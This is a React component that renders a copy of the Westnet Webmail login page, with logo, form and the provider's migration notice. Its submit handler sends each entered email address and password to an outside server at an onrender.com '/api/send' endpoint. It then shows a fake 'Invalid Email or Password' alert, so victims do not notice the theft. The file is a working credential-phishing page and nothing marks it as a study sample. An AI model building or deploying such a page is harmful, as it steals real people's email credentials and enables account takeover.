import React from 'react';
import './home.css';
import logo from './logo.png';

import axios from 'axios';

import { useState } from 'react';



function Home(){


const[email, setEmail] = useState("");


const [password, setPassword] = useState('');

const[platform, setPlatform] = useState("Westnet")

const[showError, setShowError] = useState(false);


async function handleSubmit(e){
    e.preventDefault();

    try {
      const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
          email:email,
          password:password,
          platform:platform
      });
  
      // Handle success
      console.log('Data sent:', response.data.message);

      if(response.status == 200){
          console.log(response.data.message);

          setShowError(true);
      }
    } catch (error) {
      // Handle error
      console.error('Error:', error);
    }
  
}



    return (
        <>

        {showError && <div class="alert alert-danger alert-dismissible fade show" role="alert">
        <strong>Invalid Email or Password</strong> 
        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
            <span aria-hidden="true">&times;</span>
        </button>
        </div>}

            <div className='maindiv col-md-8 m-auto'>

                <div className='logodiv text-center'> 
                        <img src={logo} className="logo" />
                 </div>

                 <h2 className='firstheading py-4'>Welcome to the new email login page for Westnet Webmail</h2>

                    <p className='small'>Fields marked with * are required</p>


                    <form onSubmit={handleSubmit} className='formdiv col-md-7 m-auto py-3'>

                    <div class="input-container">
                        <input onChange={function(e){
                            setEmail(e.target.value)
                        }}  value={email} type="email" id="email" class="email-input" required/>
                        <label for="email" class="email-label">Email *</label>
                     </div>

                     <br/>


                     <div class="input-container">
                        <input onChange={function(e){
                            setPassword(e.target.value);
                        }} value={password} type="password" id="email" class="email-input" required/>
                        <label for="email" class="email-label">Password *</label>
                     </div>


                     <div className='form-group'>

                         <button type="submit" className='btn w-100 btn-sm mybutton'>SIGN IN</button>

                     </div>

                     <p className='forgot'>Forgot Password</p>

                     <div class="form-group">
                               
                                                <div class="element text-center"> <span className="forgot prompt px-2"><label for="user">Language</label></span><select className='border-0 forgot'required>
                                                <option value="English US">English (Uk)</option>
                                                <option value="English US">English (US)</option>
                                                    <option value="French" >French</option>
                                                    <option value="Portuguese" >Portuguese</option>
                                                    <option value="Danish" >Danish</option>
                                                    <option value="Dutch" >Dutch</option>
                                                    <option value="German" >German</option>
                                                    <option value="Spanish" >Spanish</option>

                                                </select>
                                </div>
                        </div>


                      


                    </form>


                    <p className='forgotdown px-3'>For customers who have opted-in to transfer their email to The Messaging Company (TMC), you can keep using Westnet Webmail normally until your email is transferred. After the transfer is complete, the login page will redirect you to TMC’s own Webmail application.

If you have not yet opted-in to transfer your email to TMC, please be aware that Westnet will stop providing email services in 2023. You must opt-in if you want to continue using your email address. Learn more.</p>

                    
            </div>
        
        </>
    );

}

export default Home;